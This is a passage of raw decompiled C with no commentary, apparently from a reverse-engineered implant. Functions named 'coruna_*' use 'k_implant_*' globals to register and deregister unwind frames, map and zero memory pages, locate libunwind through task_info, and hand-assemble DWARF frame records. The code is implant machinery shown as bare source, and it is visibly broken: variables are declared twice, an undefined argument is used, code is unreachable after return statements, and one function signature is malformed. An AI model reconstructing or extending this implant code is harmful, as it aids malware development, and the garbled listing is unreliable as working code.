                                entry[0x3f] = 0;
                                if (serial_11 == 0) {
                                  entry = *(byte **)(entry + 0x28);
                                  if (entry != (byte *)0x0) {
                                    entry_12[3] = serial_8;
                                    entry_12 = *(long **)(entry + 0x18);
                                    k_implant_rodata_word_24ca0 = entry;
                                    goto load_ok_56;
                                  }
                                  _free((void *)**(uint64_t **)(entry_13 + 0x18));
                                  _free(*(void **)(entry_13 + 0x18));
                                  k_implant_rodata_word_24ca0 = (byte *)0x0;
                                }
                                else {
                                  entry_12[3] = serial_11 + serial_8;
                                  *(uint64_t *)(serial_11 + serial_8 + 0x10) =
                                       *(uint64_t *)(entry + 0x28);
                                  entry = *(byte **)(entry + 0x28);
                                  entry_12 = *(long **)(entry_13 + 0x18);
                                  if (entry != (byte *)0x0) {
load_ok_56:
                                    *(long *)(entry + entry_12[4] + 8) = serial_11;
                                  }
                                  block = (uint64_t *)
                                            (*entry_12 + (unsigned long)((int)entry_12[1] - 1U & type_id) * 0x10
                                            );
                                  *(int *)(block + 1) = *(int *)(block + 1) + -1;
                                  if ((byte *)*block == entry_9) {
                                    *block = 0;
                                  }
                                  *(int *)(entry_12 + 2) = (int)entry_12[2] + -1;
                                }
                                entry_9[0] = 0;
                                entry_9[1] = 0;
                                entry_9[2] = 0;
                                entry_9[3] = 0;
                                entry_9[4] = 0;
                                entry_9[5] = 0;
                                entry_9[6] = 0;
                                entry_9[7] = 0;
                              }
                              else {
                                _bzero(entry_10,(unsigned long)type_id_8 << 5);
                                entry_12 = *(long **)entry_9;
                                type_id_9 = *(uint *)(entry_12 + 1);
                                type_id = *(uint *)(entry_12 + 2) >>
                                        (unsigned long)(*(int *)((long)entry_12 + 0xc) + 1U & 0x1f);
                                type_id_8 = type_id_9 * 2 - 1;
                                if ((type_id_8 & *(uint *)(entry_12 + 2)) != 0) {
                                  type_id = type_id + 1;
                                }
                                *(uint *)(entry_12 + 5) = type_id;
                                *(uint32_t *)((long)entry_12 + 0x2c) = 0;
                                if (type_id_9 == 0) {
                                  entry_11 = (void *)*entry_12;
                                }
                                else {
                                  i = 0;
                                  type_id_17 = 0;
                                  entry_11 = (void *)*entry_12;
                                  do {
                                    serial_8 = *(long *)((long)entry_11 + type_id_17 * 0x10);
                                    while (serial_8 != 0) {
                                      serial_11 = *(long *)(serial_8 + 0x20);
                                      type_id_19 = (unsigned long)(*(uint *)(serial_8 + 0x34) & type_id_8);
                                      size = *(int *)((long)entry_10 + type_id_19 * 0x10 + 8) + 1;
                                      *(uint *)((long)entry_10 + type_id_19 * 0x10 + 8) = size;
                                      if (type_id < size) {
                                        i = i + 1;
                                        *(int *)((long)entry_12 + 0x2c) = i;
                                        tag = 0;
                                        if (type_id != 0) {
                                          tag = size / type_id;
                                        }
                                        *(uint *)((long)entry_10 + type_id_19 * 0x10 + 0xc) = tag;
                                      }
                                      *(uint64_t *)(serial_8 + 0x18) = 0;
                                      entry_16 = (long *)((long)entry_10 + type_id_19 * 0x10);
                                      serial_9 = *entry_16;
                                      *(long *)(serial_8 + 0x20) = serial_9;
                                      if (serial_9 != 0) {
                                        *(long *)(serial_9 + 0x18) = serial_8;
                                      }
                                      *entry_16 = serial_8;
                                      serial_8 = serial_11;
                                    }
                                    type_id_17 = type_id_17 + 1;
                                  } while (type_id_17 != type_id_9);
                                }
                                _free(entry_11);
                                block = *(uint64_t **)entry_9;
                                *(int *)(block + 1) = *(int *)(block + 1) << 1;
                                *(int *)((long)block + 0xc) = *(int *)((long)block + 0xc) + 1;
                                *block = entry_10;
                                if (*(uint *)(block + 2) >> 1 < *(uint *)((long)block + 0x2c)) {
                                  i = *(int *)(block + 6);
                                  *(uint *)(block + 6) = i + 1U;
                                  if (1 < i + 1U) {
                                    *(uint32_t *)((long)block + 0x34) = 1;
                                  }
                                }
                                else {
                                  *(uint32_t *)(block + 6) = 0;
                                }
                              }
                            }
                          }
load_ok_50:
                          _pthread_mutex_unlock((pthread_mutex_t *)&k_implant_rodata_word_24610);
                          ___register_frame(fde);
                          type_id = (int)type_id_18 + count + 4;
                          type_id_18 = (unsigned long)type_id;
                        }
                        _free(entry);
                        type_id = 0xad009;
                      }
                    }
                    else {
                      type_id = 0xad008;
                    }
load_ok_51:
                    _pthread_mutex_unlock((pthread_mutex_t *)&k_implant_rodata_word_24610);
                  }
                  else {
                    type_id = -type_id_9;
                    if (-1 < (int)type_id_9) {
                      type_id = type_id_9;
                    }
                    type_id = type_id | 0x40000000;
                  }
                  break;
                }
load_ok_57:
                ___register_frame(fde);
                type_id = (int)type_id_18 + count + 4;
                type_id_18 = (unsigned long)type_id;
              } while (type_id < version);
            }
          }
switchD_0001494c_caseD_4d:
          if ((uint)type_id_20 != 0) {
            type_id = (uint)type_id_20;
          }
          type_id_20 = (unsigned long)type_id;
          type_id_15 = type_id_15 + 1;
          if (*(uint *)(arg + 0x1e) <= type_id_15) {
            return type_id_20;
          }
          serial_8 = arg[0x1d];
        } while( true );
      }
    }
  }
  return type_id_15;
}





uint coruna_munmap(long handle)
{
  int *fde;
  long *ptr;
  uint u;
  int err;
  uint size;
  uint version;
  uint64_t *ptr;
  long *buf;
  long handle;
  void *str;
  void *copy;
  unsigned long port;
  long addr;
  void *data;
  uint tag;
  unsigned long kind;
  long off;
  
  if (handle == 0) {
    return 0xad001;
  }
  if (*(char *)(handle + 0xfd) == '\0') {
    return 0;
  }
  addr = *(long *)(handle + 0xe8);
  if (addr == 0) {
    return 0xad00f;
  }
  if (*(int *)(handle + 0xf0) == 0) {
    return 0xad00f;
  }
  port = 0;
  version = 0;
  do {
    ptr = (long *)(addr + port * 0x10);
    off = *ptr;
    size = *(uint *)(ptr + 1);
    tag = 0xad001;
    if (off != 0 && size != 0) {
      kind = 0;
      do {
        fde = (int *)(off + kind);
        err = *fde;
        if (fde[1] != 0) {
          if (fde == (int *)0x0) {
            tag = 0xad001;
            goto done;
          }
          ___deregister_frame(fde);
        }
        tag = (int)kind + err + 4;
        kind = (unsigned long)tag;
      } while (tag < size);
      tag = 0;
    }
done:
    if (*(char *)(addr + port * 0x10 + 0xc) != '\0') {
      _bzero((void *)*ptr,(unsigned long)*(uint *)(ptr + 1));
      _munmap(*ptr,0x4000);
      *ptr = 0;
      ptr[1] = 0;
    }
    while( true ) {
      if (version != 0) {
        tag = version;
      }
      port = port + 1;
      if (*(uint *)(handle + 0xf0) <= port) {
        _bzero(*(void **)(handle + 0xe8),(unsigned long)*(uint *)(handle + 0xf0) << 4);
        _free(*(void **)(handle + 0xe8));
        *(uint64_t *)(handle + 0xe8) = 0;
        *(uint32_t *)(handle + 0xf0) = 0;
        if (k_implant_rodata_word_24ca0 == (void *)0x0) {
          return tag;
        }
        version = _pthread_mutex_lock((pthread_mutex_t *)&k_implant_rodata_word_24610);
        if (version != 0) {
          tag = -version;
          if (-1 < (int)version) {
            tag = version;
          }
          return tag | 0x40000000;
        }
        copy = k_implant_rodata_word_24ca0;
        if (k_implant_rodata_word_24ca0 != (void *)0x0) goto cleanup;
        _pthread_mutex_unlock((pthread_mutex_t *)&k_implant_rodata_word_24610);
        return tag;
      }
      addr = *(long *)(handle + 0xe8);
      version = tag;
      if (addr != 0) break;
fail:
      tag = 0xad00f;
    }
  } while( true );
cleanup:
  addr = k_implant_rodata_word_24ca8;
  data = *(void **)((long)copy + 0x28);
  if (*(long *)((long)copy + 8) == *(long *)(handle + 0x100)) {
    if (k_implant_rodata_word_24ca8 != 0) {
      err = *(int *)((long)copy + 0x14) + -0x61c88647;
      version = ((uint)*(byte *)((long)copy + 0x13) * 0x1000000 - err) +
              (uint)*(byte *)((long)copy + 0x12) * 0x10000 +
              (uint)*(byte *)((long)copy + 0x11) * 0x100 + (uint)*(byte *)((long)copy + 0x10)
              + 0x9f49bac2 ^ 0x7f76d;
      size = (err - version) + 0x1124109 ^ version << 8;
      u = 0xfeedbef7 - (version + size) ^ size >> 0xd;
      version = version - (size + u) ^ u >> 0xc;
      size = size - (u + version) ^ version << 0x10;
      u = u - (version + size) ^ size >> 5;
      version = version - (size + u) ^ u >> 3;
      size = size - (u + version) ^ version << 10;
      version = u - (version + size) ^ size >> 0xf;
      ptr = *(uint64_t **)(k_implant_rodata_word_24ca8 + 0x10);
      off = *(long *)((long)*ptr + (unsigned long)(*(int *)(ptr + 1) - 1U & version) * 0x10);
      if (off != 0) {
        handle = ptr[4];
        do {
          str = (void *)(off - handle);
          if (((*(uint *)((long)str + 0x44) == version) && (*(int *)((long)str + 0x40) == 8)) &&
             (**(long **)((long)str + 0x38) == *(long *)((long)copy + 0x10))) {
            off = *(long *)((long)str + 0x18);
            if ((off == 0) && (*(long *)((long)str + 0x20) == 0)) {
              _free((void *)*ptr);
              _free(*(void **)(addr + 0x10));
              k_implant_rodata_word_24ca8 = 0;
            }
            else {
              if (ptr[3] == (long)str + 0x10) {
                ptr[3] = off + handle;
              }
              if (off == 0) {
                addr = *(long *)((long)str + 0x20);
                k_implant_rodata_word_24ca8 = addr;
              }
              else {
                *(uint64_t *)(off + handle + 0x10) = *(uint64_t *)((long)str + 0x20);
                addr = *(long *)((long)str + 0x20);
              }
              if (addr != 0) {
                *(long *)(addr + *(long *)(*(long *)(k_implant_rodata_word_24ca8 + 0x10) + 0x20) + 8) = off;
              }
              buf = *(long **)(k_implant_rodata_word_24ca8 + 0x10);
              ptr = (long *)(*buf + (unsigned long)((int)buf[1] - 1U & version) * 0x10);
              *(int *)(ptr + 1) = (int)ptr[1] + -1;
              if (*ptr == (long)str + 0x10) {
                *ptr = *(long *)((long)str + 0x30);
              }
              addr = *(long *)((long)str + 0x28);
              if (addr != 0) {
                *(uint64_t *)(addr + 0x20) = *(uint64_t *)((long)str + 0x30);
              }
              if (*(long *)((long)str + 0x30) != 0) {
                *(long *)(*(long *)((long)str + 0x30) + 0x18) = addr;
              }
              *(int *)(buf + 2) = (int)buf[2] + -1;
            }
            _free(str);
            break;
          }
          off = *(long *)((long)str + 0x30);
        } while (off != 0);
      }
    }
    str = k_implant_rodata_word_24ca0;
    addr = *(long *)((long)copy + 0x20);
    if ((addr == 0) && (*(long *)((long)copy + 0x28) == 0)) {
      _free((void *)**(uint64_t **)((long)k_implant_rodata_word_24ca0 + 0x18));
      _free(*(void **)((long)str + 0x18));
      k_implant_rodata_word_24ca0 = (void *)0x0;
    }
    else {
      off = *(long *)((long)k_implant_rodata_word_24ca0 + 0x18);
      if ((long)copy + 0x18 == *(long *)(off + 0x18)) {
        *(long *)(off + 0x18) = addr + *(long *)(off + 0x20);
        if (addr != 0) goto skip;
next:
        str = *(void **)((long)copy + 0x28);
        k_implant_rodata_word_24ca0 = str;
      }
      else {
        if (addr == 0) goto next;
skip:
        *(uint64_t *)(addr + *(long *)(off + 0x20) + 0x10) =
             *(uint64_t *)((long)copy + 0x28);
        str = *(void **)((long)copy + 0x28);
      }
      if (str != (void *)0x0) {
        *(long *)((long)str + *(long *)(*(long *)((long)k_implant_rodata_word_24ca0 + 0x18) + 0x20) + 8) =
             addr;
      }
      buf = *(long **)((long)k_implant_rodata_word_24ca0 + 0x18);
      ptr = (long *)(*buf +
                       (unsigned long)((int)buf[1] - 1U & *(uint *)((long)copy + 0x4c)) * 0x10);
      *(int *)(ptr + 1) = (int)ptr[1] + -1;
      if (*ptr == (long)copy + 0x18) {
        *ptr = *(long *)((long)copy + 0x38);
      }
      addr = *(long *)((long)copy + 0x30);
      if (addr != 0) {
        *(uint64_t *)(addr + 0x20) = *(uint64_t *)((long)copy + 0x38);
      }
      if (*(long *)((long)copy + 0x38) != 0) {
        *(long *)(*(long *)((long)copy + 0x38) + 0x18) = addr;
      }
      *(int *)(buf + 2) = (int)buf[2] + -1;
    }
    _free(copy);
  }
  copy = data;
  if (data == (void *)0x0) {
check_ok:
    _pthread_mutex_unlock((pthread_mutex_t *)&k_implant_rodata_word_24610);
    return tag;
  }
  goto cleanup;
}





uint64_t coruna_task_info(long handle)
{
  kern_return_t lk1;
  int err;
  long handle;
  uint64_t u;
  int *err;
  uint64_t size;
  long addr;
  unsigned long version;
  uint64_t *ptr;
  mach_msg_type_number_t scratch;
  long bootargs [2];
  uint32_t thread_attr;
  
  size = 0xad011;
  if (handle == 0) {
    return 0xad001;
  }
  handle = _dlopen("/usr/lib/system/libunwind.dylib",2);
  if (handle == 0) {
    return 0x18004;
  }
  bootargs[0] = 0;
  bootargs[1] = 0;
  thread_attr = 0;
  scratch = 5;
  lk1 = _task_info(*(task_name_t *)k_implant_mach_task_self_slot,0x11,(task_info_t)bootargs,
                     &scratch);
  if (lk1 == 0 && scratch == 5) {
    u = 0xad014;
    if ((bootargs[0] != 0) && (*(long *)(bootargs[0] + 8) != 0)) {
      version = (unsigned long)*(uint *)(bootargs[0] + 4);
      if (*(uint *)(bootargs[0] + 4) == 0) {
        u = 0xad014;
      }
      else {
        ptr = (uint64_t *)(*(long *)(bootargs[0] + 8) + 8);
        do {
          if (((char *)*ptr != (char *)0x0) &&
             (err = _strcmp((char *)*ptr,"/usr/lib/system/libunwind.dylib"), err == 0)) {
            addr = ptr[-1];
            u = 0xad001;
            if ((addr != 0) && (err = *(int *)(addr + 0x10), u = size, err != 0)) {
              err = (int *)(addr + 0x20);
              goto fail;
            }
            break;
          }
          ptr = ptr + 3;
          version = version - 1;
          u = size;
        } while (version != 0);
      }
    }
  }
  else {
    u = 0xad00b;
  }
  _dlclose(handle);
  return u;
  while( true ) {
    err = (int *)((long)err + (unsigned long)(uint)err[1]);
    err = err + -1;
    if (err == 0) break;
fail:
    if (*err == 0x2a) {
      size = *(uint64_t *)(err + 2);
      bootargs[0] = 0;
      u = coruna_implant65fc_via_ctx_free_11dc8(handle,addr,0,0x10,bootargs);
      if ((int)u == 0) {
        *(uint32_t *)(handle + 0x118) = 0;
        *(long *)(handle + 0x100) = handle;
        *(uint64_t *)(handle + 0x108) = size;
        *(long *)(handle + 0x110) = addr;
        return u;
      }
      break;
    }
  }
done:
  _dlclose(handle);
  return u;
}





uint64_t coruna_return_zero_15dbc(int *flags,void (*val,uint64_t val)
{
  int *err;
  uint u;
  uint size;
  unsigned long version;
  uint32_t *ptr;
  int *status;
  uint64_t port;
  unsigned long tag;
  unsigned long kind;
  
  port = 0xad001;
  if ((flags != (int *)0x0) && (arg != (void (*)0x0)) {
    if ((((unsigned long)flags & 3) == 0) && (*flags == 1)) {
      tag = 0;
      do {
        if ((uint)flags[6] <= tag) {
          return 0;
        }
        status = (int *)((long)flags + tag * 0xc + (unsigned long)(uint)flags[5]);
        if (status == (int *)0x0) {
          return 0xad001;
        }
        if (((unsigned long)status & 3) != 0) {
          return 0xad014;
        }
        version = (unsigned long)(uint)status[1];
        if (status[1] == 0) {
          port = (*arg)(*status,0,0,0,1,val);
        }
        else {
          err = (int *)((long)flags + version);
          if (*err == 3) {
            if (err == (int *)0x0) {
              return 0xad001;
            }
            if (((unsigned long)err & 3) != 0) {
              return 0xad014;
            }
            kind = 0;
            while (kind < *(ushort *)((long)err + 6)) {
              u = *(uint *)((long)flags + kind * 4 + *(ushort *)(err + 1) + version);
              size = u >> 0x18;
              if (size < (uint)flags[2]) {
                ptr = (uint32_t *)((long)flags + (unsigned long)size * 4 + (unsigned long)(uint)flags[1]);
              }
              else {
                ptr = (uint32_t *)
                         ((long)err +
                         (unsigned long)(size - flags[2]) * 4 + (unsigned long)*(ushort *)(err + 2));
              }
              port = coruna_implant65fc_residual_121(flags,status,(u & 0xffffff) + *status,*ptr,arg,
                                   val);
              kind = kind + 1;
              if ((int)port != 0) {
                return port;
              }
            }
          }
          else {
            if (*err != 2) {
              return 0xad014;
            }
            if (err == (int *)0x0) {
              return 0xad001;
            }
            if (((unsigned long)err & 3) != 0) {
              return 0xad014;
            }
            kind = 0xffffffffffffffff;
            while (kind = kind + 1, kind < *(ushort *)((long)err + 6)) {
              if (((int)flags + (int)version + (uint)*(ushort *)(err + 1) & 3) != 0) {
                return 0xad014;
              }
              ptr = (uint32_t *)((long)flags + version + *(ushort *)(err + 1));
              port = coruna_implant65fc_residual_121(flags,status,*ptr,ptr[1],arg,val);
              version = version + 8;
              if ((int)port != 0) {
                return port;
              }
            }
          }
          port = 0;
        }
        tag = tag + 1;
      } while ((int)port == 0);
    }
    else {
      return 0xad014;
    }
  }
  return port;
}





uint64_t coruna_reallocf(int flags)
{
  long handle;
  uint64_t u;
  uint32_t *ptr;
  void *ptr;
  uint64_t *in_x5;
  long addr;
  
  u = 0xad001;
  if ((flags != 0) && (in_x5 != (uint64_t *)0x0)) {
    ptr = (uint32_t *)*in_x5;
    if (ptr == (uint32_t *)0x0) {
      ptr = _malloc(4);
      *in_x5 = ptr;
      if (ptr == (uint32_t *)0x0) {
        return 0xad009;
      }
      *ptr = 0;
    }
    handle = 0;
    do {
      addr = handle;
      handle = addr + 4;
    } while (*(int *)((long)ptr + addr) != 0);
    ptr = _reallocf(ptr,addr + 8);
    *in_x5 = ptr;
    u = 0xad009;
    if (ptr != (void *)0x0) {
      u = 0;
      ptr = (uint32_t *)((long)ptr + addr + 4);
      ptr[-1] = flags;
      *ptr = 0;
    }
  }
  return u;
}





void coruna_bzero_5_2(uint size,uint flags_2,uint count_3,uint version_4,uint version_5,long *handle)
{
  uint u;
  bool err;
  bool status;
  bool flags;
  void *ptr;
  uint32_t size;
  uint version;
  unsigned long port;
  unsigned long tag;
  long *buf;
  long handle;
  uint kind;
  uint type_id;
  uint type_id_8;
  char err;
  uint type_id_9;
  uint32_t *ptr;
  uint *buf;
  uint scratch;
  uint8_t bootargs[3];
  uint8_t scratch;
  uint32_t bootargs;
  uint64_t thread_attr;
  uint64_t thread_attr;
  uint64_t host_info;
  uint64_t serial_buf;
  uint64_t action;
  uint64_t block_ctx;
  uint64_t stack_guard;
  uint64_t host_info;
  uint64_t sa_saved;
  uint64_t sa_new;
  uint64_t path_buf;
  uint64_t serial_buf;
  uint64_t tmp_buf;
  uint64_t region;
  uint64_t plist;
  long action;
  uint *str;
  
  action = *(long *)k_implant_stack_chk_guard_slot;
  tmp_buf = 0;
  serial_buf = 0;
  plist = 0;
  region = 0;
  sa_saved = 0;
  host_info = 0;
  path_buf = 0;
  sa_new = 0;
  action = 0;
  serial_buf = 0;
  stack_guard = 0;
  block_ctx = 0;
  thread_attr = 0;
  _local_b0 = 0;
  host_info = 0;
  thread_attr = 0;
  if (((((((version_5 != 0) || (size == 0)) || (flags_2 == 0)) ||
        ((handle == (long *)0x0 || (*handle == 0)))) ||
       ((handle[1] == 0 ||
        (((int)version_4 < 0 || (port = *(unsigned long *)(*handle + 0x10), port <= size)))))) ||
      (port <= count_3)) || (port <= version_4)) {
    type_id_8 = 0;
    if (flags_2 != 0) {
      type_id_8 = 0xad001;
    }
    kind = 0;
    if ((version_5 & 1) == 0) {
      kind = type_id_8;
    }
    port = (unsigned long)kind;
    if (*(long *)k_implant_stack_chk_guard_slot == action) {
    return;
    }
    ___stack_chk_fail(port);
  }
  _local_b0 = 0;
  bootargs = 0;
  thread_attr = 1;
  if (count_3 == 0 && version_4 == 0) {
    thread_attr = 0x527a01;
    port = 0xc;
  }
  else if ((count_3 == 0) && (version_4 != 0)) {
    size = 0x52507a;
    thread_attr = (unsigned long)coruna_cat(size,1);
    port = 0xd;
  }
  else if ((count_3 == 0) || (version_4 != 0)) {
    *(uint8_t *)((uint32_t *)((unsigned long)bootargs | 9) + 1) = 0;
    *(uint32_t *)((unsigned long)bootargs | 9) = 0x524c507a;
    port = 0xe;
  }
  else {
    size = 0x524c7a;
    thread_attr = (unsigned long)coruna_cat(size,1);
    port = 0xd;
  }
  *(uint32_t *)((unsigned long)bootargs | port) = 0x1e7801;
  type_id_8 = (int)port + 3;
  if (version_4 == 0) {
    tag = 1;
  }
  else {
    bootargs[(unsigned long)type_id_8 + 1] = 0x84;
    *(unsigned long *)(bootargs + (unsigned long)type_id_8 + 2) = *(long *)(*handle + 0x100) + (unsigned long)version_4;
    tag = 10;
  }
  if (count_3 != 0) {
    bootargs[tag + type_id_8] = 4;
    tag = (unsigned long)((int)tag + 1);
  }
  bootargs[tag + type_id_8] = 4;
  kind = 0xad001;
  scratch = type_id_8;
  if (type_id_8 < 0x80) {
    kind = 0;
    bootargs[type_id_8] = (char)tag;
    scratch = (int)port + 4;
  }
  scratch = scratch + (int)tag;
  port = (unsigned long)scratch;
  u = flags_2 & 0xf000000;
  if (u == 0x4000000 || u == 0x2000000) {
    if (scratch < 0x7e) {
      err = false;
      type_id_9 = 0;
      bootargs[(unsigned long)scratch + 2] = 0;
      *(uint16_t *)(bootargs + scratch) = 0x1f0c;
      scratch = scratch + 3;
      port = (unsigned long)scratch;
    }
    else {
      err = false;
      type_id_9 = 0xad00c;
    }
  }
  else if (u == 0x3000000) {
    type_id_9 = 0;
    err = true;
  }
  else {
    err = false;
    type_id_9 = 0xad014;
  }
  version = (uint)port;
  if (0x7f < type_id_8) {
    type_id_9 = kind;
  }
  ptr = (uint32_t *)(bootargs + port);
  if (ptr < (uint32_t *)((unsigned long)(bootargs + port + 7) & 0xfffffffffffffff8)) {
    port = (unsigned long)scratch;
    do {
      *(uint8_t *)ptr = 0;
      version = (int)port + 1;
      port = (unsigned long)version;
      ptr = (uint32_t *)(bootargs + port);
      scratch = version;
    } while (ptr < (uint32_t *)((unsigned long)(bootargs + port + 7) & 0xfffffffffffffff8));
  }
  _local_b0 = coruna_u64_pack((bootargs), (version - 4));
  *ptr = 0;
  *(uint *)(bootargs + (scratch + 4)) = scratch + 4;
  buf = (uint *)handle[1];
  port = *(long *)(*handle + 0x100) + (unsigned long)size;
  *(unsigned long *)(bootargs + (scratch + 8)) = port;
  do {
    str = buf + 1;
    type_id_8 = *buf;
    buf = str;
  } while (type_id_8 != 0 && type_id_8 != size);
  if (((type_id_8 == 0) ||
      (type_id_8 = *str, kind = type_id_8 - size, tag = (unsigned long)kind, type_id = type_id_9,
      type_id_8 < size || kind == 0)) && (tag = port, type_id = 0xad014, type_id_9 != 0)) {
    type_id = type_id_9;
  }
  *(unsigned long *)(bootargs + (scratch + 0x10)) = tag;
  type_id_8 = scratch + 0x18;
  if (count_3 == 0) {
    if (type_id_8 < 0x80) {
      kind = 0;
      bootargs[type_id_8] = 0;
      type_id_8 = scratch + 0x19;
    }
    else {
      kind = 0xad001;
    }
    scratch = type_id_8;
    if (type_id != 0) {
      kind = type_id;
    }
  }
  else {
    if (type_id_8 < 0x80) {
      kind = 0;
      bootargs[type_id_8] = 8;
      type_id_8 = scratch + 0x19;
    }
    else {
      kind = 0xad001;
    }
    if (type_id != 0) {
      kind = type_id;
    }
    *(unsigned long *)(bootargs + type_id_8) = *(long *)(*handle + 0x100) + (unsigned long)count_3;
    scratch = type_id_8 + 8;
  }
  if (u == 0x2000000) {
    bootargs[scratch] = 0xe;
    type_id_8 = scratch + 1;
    if (type_id_8 < 0x80) {
      type_id_9 = flags_2 >> 8 & 0xfff0;
      port = (unsigned long)type_id_9;
      type_id = flags_2 >> 8 & 0x70;
      tag = (unsigned long)type_id;
      bootargs[type_id_8] = (char)type_id;
      scratch = scratch + 2;
      status = 0x7f < type_id_9;
      if ((status) && (type_id_8 = scratch, scratch != 0x80)) {
        do {
          bootargs[type_id_8 - 1] = (byte)tag | 0x80;
          tag = port >> 7 & 0x7f;
          bootargs[type_id_8] = (char)tag;
          scratch = type_id_8 + 1;
          status = 0x3fff < port;
          if (!status) break;
          port = port >> 7;
          flags = type_id_8 != 0x7f;
          type_id_8 = scratch;
        } while (flags);
      }
      type_id_8 = 0;
      if (status) {
        type_id_8 = 0xad00c;
      }
      err = '\x01';
    }
    else {
      scratch = type_id_8;
      type_id_8 = 0xad001;
    }
  }
  if (u == 0x4000000) {
    if (scratch < 0x7a) {
      *(uint32_t *)(bootargs + (unsigned long)scratch + 3) = 0x29d019e;
      *(uint32_t *)(bootargs + scratch) = 0x9e101d0c;
      scratch = scratch + 7;
      err = '\x03';
    }
    else {
      type_id_8 = 0xad00c;
    }
  }
  if (((u == 0x2000000) && (type_id_8 == 0) && (err == '\x01')) ||
     ((u == 0x4000000) && (type_id_8 != 0xad00c) && (err == '\x03'))) {
next:
      if ((flags_2 & 1) == 0) {
retry:
        if ((flags_2 >> 1 & 1) == 0) {
found:
          if ((flags_2 >> 2 & 1) == 0) {
nomem:
            if ((flags_2 >> 3 & 1) == 0) {
invalid:
              if ((flags_2 >> 4 & 1) == 0) {
                if ((flags_2 >> 8 & 1) == 0) {
again:
                  if ((flags_2 >> 9 & 1) == 0) {
exit_ok:
                    if ((flags_2 >> 10 & 1) == 0) {
joined_r0x00016860:
                      if ((flags_2 >> 0xb & 1) == 0) {
                        type_id_8 = 0;
                        u = 0;
                        if (type_id_8 != 0xad005) {
                        u = type_id_8;
                        }
                        if (kind != 0) {
                        u = kind;
                        }
                        port = (unsigned long)u;
                        *(uint *)(bootargs + (unsigned long)(version - 4) + 4) = (scratch - version) + -4;
                        if (*(long *)k_implant_stack_chk_guard_slot == action) {
                        return;
                        }
                        ___stack_chk_fail(port);
                        buf = (long *)handle[2];
                        if ((buf == (long *)0x0) ||
                        ((handle = *buf, handle == 0 ||
                        (type_id_8 = *(uint *)(buf + 1), 0x4000 < scratch + type_id_8)))) {
                        port = coruna_vec_push_pair(*handle + 0xe8,*handle + 0xf0);
                        if (*(long *)k_implant_stack_chk_guard_slot == action) {
                        return;
                        }
                        ___stack_chk_fail(port);
                        handle[2] = *(long *)(*handle + 0xe8) + (unsigned long)(*(int *)(*handle + 0xf0) - 1) * 0x10;
                        ptr = (void *)_mmap(0,0x4000,3,&k_implant_mmap_anon_fd,0xffffffff,0);
                        *(void **)handle[2] = ptr;
                        if (ptr == (void *)0xffffffffffffffff) {
                        port = 0xad009;
                        if (*(long *)k_implant_stack_chk_guard_slot == action) {
                        return;
                        }
                        ___stack_chk_fail(port);
                        }
                        _bzero(ptr,0x4000);
                        type_id_8 = 0;
                        buf = (long *)handle[2];
                        *(uint32_t *)(buf + 1) = 0;
                        *(uint8_t *)((long)buf + 0xc) = 1;
                        handle = *buf;
                        }
                        _memcpy((void *)(handle + (unsigned long)type_id_8),bootargs,(unsigned long)scratch);
                        port = 0;
                        *(uint *)(handle[2] + 8) = *(int *)(handle[2] + 8) + scratch;
                        if (*(long *)k_implant_stack_chk_guard_slot == action) {
                        return;
                        }
                        ___stack_chk_fail(port);
                      }
                      bootargs[scratch] = 0xce;
                      type_id_8 = scratch + 1;
                      if (type_id_8 < scratch + 2) {
                        bootargs[type_id_8] = err;
                        bootargs[scratch + 2] = 0xcf;
                        type_id_8 = scratch + 3;
                        scratch = scratch + 4;
                        if (type_id_8 < scratch) {
                          bootargs[type_id_8] = err + '\x01';
                          type_id_8 = 0;
                          u = 0;
                          if (type_id_8 != 0xad005) {
                          u = type_id_8;
                          }
                          if (kind != 0) {
                          u = kind;
                          }
                          port = (unsigned long)u;
                          *(uint *)(bootargs + (unsigned long)(version - 4) + 4) = (scratch - version) + -4;
                          if (*(long *)k_implant_stack_chk_guard_slot == action) {
                          return;
                          }
                          ___stack_chk_fail(port);
                          buf = (long *)handle[2];
                          if ((buf == (long *)0x0) ||
                          ((handle = *buf, handle == 0 ||
                          (type_id_8 = *(uint *)(buf + 1), 0x4000 < scratch + type_id_8)))) {
                          port = coruna_vec_push_pair(*handle + 0xe8,*handle + 0xf0);
                          if (*(long *)k_implant_stack_chk_guard_slot == action) {
                          return;
                          }
                          ___stack_chk_fail(port);
                          handle[2] = *(long *)(*handle + 0xe8) + (unsigned long)(*(int *)(*handle + 0xf0) - 1) * 0x10;
                          ptr = (void *)_mmap(0,0x4000,3,&k_implant_mmap_anon_fd,0xffffffff,0);
                          *(void **)handle[2] = ptr;
                          if (ptr == (void *)0xffffffffffffffff) {
                          port = 0xad009;
                          if (*(long *)k_implant_stack_chk_guard_slot == action) {
                          return;
                          }
                          ___stack_chk_fail(port);
                          }
                          _bzero(ptr,0x4000);
                          type_id_8 = 0;
                          buf = (long *)handle[2];
                          *(uint32_t *)(buf + 1) = 0;
                          *(uint8_t *)((long)buf + 0xc) = 1;
                          handle = *buf;
                          }
                          _memcpy((void *)(handle + (unsigned long)type_id_8),bootargs,(unsigned long)scratch);
                          port = 0;
                          *(uint *)(handle[2] + 8) = *(int *)(handle[2] + 8) + scratch;
                          if (*(long *)k_implant_stack_chk_guard_slot == action) {
                          return;
                          }
                          ___stack_chk_fail(port);
                        }
                      }
                    }
                    else {
                      bootargs[scratch] = 0xcc;
                      type_id_8 = scratch + 1;
                      if (type_id_8 < scratch + 2) {
                        bootargs[type_id_8] = err;
                        bootargs[scratch + 2] = 0xcd;
                        type_id_8 = scratch + 3;
                        scratch = scratch + 4;
                        if (type_id_8 < scratch) {
                          bootargs[type_id_8] = err + '\x01';
                          err = err + '\x02';
                          goto joined_r0x00016860;
                        }
                      }
                    }
                  }
                  else {
                    bootargs[scratch] = 0xca;
                    type_id_8 = scratch + 1;
                    if (type_id_8 < scratch + 2) {
                      bootargs[type_id_8] = err;
                      bootargs[scratch + 2] = 0xcb;
                      type_id_8 = scratch + 3;
                      scratch = scratch + 4;
                      if (type_id_8 < scratch) {
                        bootargs[type_id_8] = err + '\x01';
                        err = err + '\x02';
                        goto exit_ok;
                      }
                    }
                  }
                }
                else {
load_ok:
                  bootargs[scratch] = 200;
                  type_id_8 = scratch + 1;
                  if (type_id_8 < scratch + 2) {
                    bootargs[type_id_8] = err;
                    bootargs[scratch + 2] = 0xc9;
                    type_id_8 = scratch + 3;
                    scratch = scratch + 4;
                    if (type_id_8 < scratch) {
                      bootargs[type_id_8] = err + '\x01';
                      err = err + '\x02';
                      goto again;
                    }
                  }
                }
              }
              else {
                bootargs[scratch] = 0x9b;
                type_id_8 = scratch + 1;
                if (type_id_8 < scratch + 2) {
                  bootargs[type_id_8] = err;
